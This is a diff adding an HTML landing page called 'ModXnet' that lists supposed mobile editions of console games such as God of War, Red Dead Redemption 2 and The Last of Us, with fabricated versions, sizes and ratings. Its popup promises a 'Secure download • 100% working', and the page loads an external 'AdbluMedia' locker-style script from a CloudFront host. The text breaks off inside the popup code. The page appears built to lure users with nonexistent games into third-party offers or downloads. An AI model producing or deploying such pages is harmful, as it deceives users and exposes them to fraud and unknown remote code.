@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ModXnet | Premium Modded Games</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00ffcc;
+            --secondary: #00ccff;
+            --accent: #ff6b6b;
+            --dark: #121212;
+            --darker: #0a0a0a;
+            --light: #1e1e1e;
+            --lighter: #2a2a2a;
+            --white: #ffffff;
+            --text: #e0e0e0;
+            --text-secondary: #b0b0b0;
+            --success: #4CAF50;
+            --warning: #FFC107;
+            --danger: #F44336;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--dark);
+            color: var(--text);
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            font-size: 2rem;
+            font-weight: 600;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .logo p {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .games-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .game-card {
+            background-color: var(--light);
+            border-radius: 12px;
+            padding: 18px;
+            transition: transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .game-card:hover {
+            transform: translateY(-2px);
+            background-color: var(--lighter);
+            cursor: pointer;
+        }
+
+        .game-image {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            object-fit: cover;
+        }
+
+        .game-info {
+            flex: 1;
+        }
+
+        .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .game-title {
+            font-weight: 500;
+            font-size: 1.1rem;
+            color: var(--white);
+        }
+
+        .game-version {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+        }
+
+        .game-rating {
+            color: var(--warning);
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+        }
+
+        .game-meta {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+        }
+
+        .game-platform {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .platform-icon {
+            width: 14px;
+            height: 14px;
+        }
+
+        .game-tag {
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: 500;
+        }
+
+        .tag-mod {
+            background-color: var(--primary);
+            color: var(--dark);
+        }
+
+        /* Popup Styles */
+        .block_gameinfo {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .fakemobile {
+            background-color: var(--light);
+            border-radius: 20px;
+            width: 90%;
+            max-width: 350px;
+            padding: 25px;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .close_btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .close_btn:hover {
+            color: var(--white);
+        }
+
+        .app-icon-area {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .app-icon-region {
+            width: 70px;
+            height: 70px;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .app-modal-icon {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .fake-homescreen-app-name {
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: var(--white);
+            text-align: center;
+        }
+
+        .gamenameinfo {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--white);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .choosed_device {
+            margin-bottom: 20px;
+            text-align: center;
+            color: var(--text-secondary);
+        }
+
+        .choosed_device button {
+            background-color: var(--lighter);
+            border: none;
+            color: var(--white);
+            padding: 8px 15px;
+            margin: 5px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .choosed_device button:hover {
+            background-color: var(--primary);
+            color: var(--dark);
+        }
+
+        .choosed_device button.active {
+            background-color: var(--primary);
+            color: var(--dark);
+            font-weight: 500;
+        }
+
+        .device-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        .download_button {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .download_button button {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: var(--dark);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+            max-width: 200px;
+        }
+
+        .download_button button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 204, 255, 0.3);
+        }
+
+        .downgame {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .logo h1 {
+                font-size: 1.7rem;
+            }
+            
+            .game-card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>ModXnet</h1>
+            <p>Premium Modded Mobile Games</p>
+        </div>
+
+        <div class="games-list">
+            <!-- Game 1 -->
+            <div class="game-card" onclick="openPopup('Need For Speed Mobile', 'https://i.ibb.co/wZbqZrWm/Fiyk-DJVdy-9ytqfua-DCBB1-Mm-HNTH.jpg')">
+                <img src="https://i.ibb.co/wZbqZrWm/Fiyk-DJVdy-9ytqfua-DCBB1-Mm-HNTH.jpg" alt="Need For Speed Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Need For Speed Mobile</span>
+                        <span class="game-version">v1.3.0</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>1.2 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 2 -->
+            <div class="game-card" onclick="openPopup('Call of Duty Mobile', 'https://i.ibb.co/4gmNk2V3/unnamed.jpg')">
+                <img src="https://i.ibb.co/4gmNk2V3/unnamed.jpg" alt="Call of Duty Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Call of Duty Mobile</span>
+                        <span class="game-version">v1.0.3095/1.68</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>2.4 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 3 -->
+            <div class="game-card" onclick="openPopup('REMATCH Mobile', 'https://i.ibb.co/WhRrL4q/e4332432c1be791e1c1d624ebe544f76e2b1bb23b7211424.jpg')">
+                <img src="https://i.ibb.co/WhRrL4q/e4332432c1be791e1c1d624ebe544f76e2b1bb23b7211424.jpg" alt="REMATCH Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">REMATCH Mobile</span>
+                        <span class="game-version">v1.16.4</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                        </span>
+                        <span>800 MB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 4 -->
+            <div class="game-card" onclick="openPopup('League of Legends Mobile', 'https://i.ibb.co/R976Nd2/lol.jpg')">
+                <img src="https://i.ibb.co/R976Nd2/lol.jpg" alt="League of Legends Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">League of Legends Mobile</span>
+                        <span class="game-version">v1.656.386.0</span>
+                    </div>
+                    <div class="game-rating">★★★★★</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>3.1 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 5 -->
+            <div class="game-card" onclick="openPopup('God of War Mobile', 'https://i.ibb.co/HDnzRsJ/gow.jpg')">
+                <img src="https://i.ibb.co/HDnzRsJ/gow.jpg" alt="God of War Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">God of War Mobile</span>
+                        <span class="game-version">v1.0.0</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>2.7 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 6 -->
+            <div class="game-card" onclick="openPopup('Spider-Man 2 Mobile', 'https://i.ibb.co/McjvCfj/spiderman2.png')">
+                <img src="https://i.ibb.co/McjvCfj/spiderman2.png" alt="Spider-Man 2 Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Spider-Man 2 Mobile</span>
+                        <span class="game-version">v0.32.0.0</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                        </span>
+                        <span>1.9 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 7 -->
+            <div class="game-card" onclick="openPopup('Wolverine Mobile', 'https://i.ibb.co/VWmMFDvW/wolvrine.jpg')">
+                <img src="https://i.ibb.co/VWmMFDvW/wolvrine.jpg" alt="Wolverine Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Wolverine Mobile</span>
+                        <span class="game-version">v1.3.0</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>1.5 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 8 -->
+            <div class="game-card" onclick="openPopup('The Last of Us Mobile', 'https://i.ibb.co/tLx5P3D/tlou-1.jpg')">
+                <img src="https://i.ibb.co/tLx5P3D/tlou-1.jpg" alt="The Last of Us Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">The Last of Us Mobile</span>
+                        <span class="game-version">v1.16.4</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                        </span>
+                        <span>2.8 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 9 -->
+            <div class="game-card" onclick="openPopup('Horizon Zero Dawn Mobile', 'https://i.ibb.co/n0tBVMs/horizon.jpg')">
+                <img src="https://i.ibb.co/n0tBVMs/horizon.jpg" alt="Horizon Zero Dawn Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Horizon Zero Dawn Mobile</span>
+                        <span class="game-version">v1.0.3095/1.68</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>2.2 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 10 -->
+            <div class="game-card" onclick="openPopup('Red Dead Redemption 2 Mobile', 'https://i.ibb.co/kDmVtwv/rdr2-1.jpg')">
+                <img src="https://i.ibb.co/kDmVtwv/rdr2-1.jpg" alt="Red Dead Redemption 2 Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Red Dead Redemption 2 Mobile</span>
+                        <span class="game-version">v1.656.386.0</span>
+                    </div>
+                    <div class="game-rating">★★★★★</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                        </span>
+                        <span>3.5 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 11 -->
+            <div class="game-card" onclick="openPopup('Fortnite Mobile', 'https://i.ibb.co/W5j9ZXx/fortnite.jpg')">
+                <img src="https://i.ibb.co/W5j9ZXx/fortnite.jpg" alt="Fortnite Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Fortnite Mobile</span>
+                        <span class="game-version">v0.32.0.0</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>2.9 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 12 -->
+            <div class="game-card" onclick="openPopup('Assassin\'s Creed Mobile', 'https://i.ibb.co/0jfpcKqv/Assassin-s-Creed-III-Game-Cover.jpg')">
+                <img src="https://i.ibb.co/0jfpcKqv/Assassin-s-Creed-III-Game-Cover.jpg" alt="Assassin's Creed Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Assassin's Creed Mobile</span>
+                        <span class="game-version">v1.0.0</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>1.8 GB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 13 -->
+            <div class="game-card" onclick="openPopup('Roblox Mod', 'https://i.ibb.co/k92hJwF/roblox.png')">
+                <img src="https://i.ibb.co/k92hJwF/roblox.png" alt="Roblox Mod" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">Roblox Mod</span>
+                        <span class="game-version">v1.3.0</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        </span>
+                        <span>150 MB</span>
+                        <span class="game-tag tag-mod">MOD</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Game 14 -->
+            <div class="game-card" onclick="openPopup('GTA 4 Mobile', 'https://i.ibb.co/Mcfhc3g/gta4-1.jpg')">
+                <img src="https://i.ibb.co/Mcfhc3g/gta4-1.jpg" alt="GTA 4 Mobile" class="game-image">
+                <div class="game-info">
+                    <div class="game-header">
+                        <span class="game-title">GTA 4 Mobile</span>
+                        <span class="game-version">v1.16.4</span>
+                    </div>
+                    <div class="game-rating">★★★★☆</div>
+                    <div class="game-meta">
+                        <span class="game-platform">
+                            <svg class="platform-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                        </span>
+                        <span>1.7 GB</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Game Popup -->
+    <div class="block_gameinfo" id="gamePopup" style="display: none;">
+        <a href="#" class="close_btn" onclick="closePopup()">X</a>
+        <div class="fakemobile">
+            <div class="app-icon-area">
+                <div class="app-icon-region">
+                    <img id="popupIcon" src="" alt="App Icon" class="app-modal-icon" />
+                </div>
+                <div class="fake-homescreen-app-name" id="popupGameName">Game Name</div>
+            </div>
+            <div class="gameinfo">
+                <div class="gamenameinfo" id="popupGameTitle">Game Title</div>
+                <div class="choosed_device">
+                    Choose your device:
+                    <button onclick="chooseDevice('ios')">
+                        <svg class="device-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 54-64.4h46.3V0H222.8v298.2c0 43.6-21.1 65.5-61.5 65.5-29.3 0-47.3-12.9-54.1-38.5h-85.5v96.5H112.3v-85.9h26.6v-25.1H112.3v-85.8h85.5c5.5 30 25.9 56.1 70.4 56.1 52.3 0 90.5-26.2 90.5-88.3zm-166.4-68.2V106.4h85.5v94.1h-85.5z"/></svg>
+                        iOS
+                    </button>
+                    <button onclick="chooseDevice('android')">
+                        <svg class="device-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>
+                        Android
+                    </button>
+                </div>
+                <div class="download_button">
+                    <button onclick="startDownload()">Download</button>
+                </div>
+                <div class="downgame">Secure download • 100% working</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- AdbluMedia Script -->
+    <script type="text/javascript">
+        var hscmH_TFj_CuBNLc={"it":4458399,"key":"eee25"};
+    </script>
+    <script src="https://dfmpe7igjx4jo.cloudfront.net/00b05ef.js"></script>
+
+    <script>
+        let selectedDevice = null;
+        
+        function openPopup(gameTitle, gameIcon) {
+            document.getElementById('gamePopup').style.display = 'flex';
+            document.getElementById('popupGameName').innerText = gameTitle;
+            document.getElementById('popupGameTitle').innerText = gameTitle;
+            document.getElementById('popupIcon').src = gameIcon;
+            selectedDevice = null;
+            // Reset device buttons
+            const buttons = document.querySelectorAll('.choosed_device button');
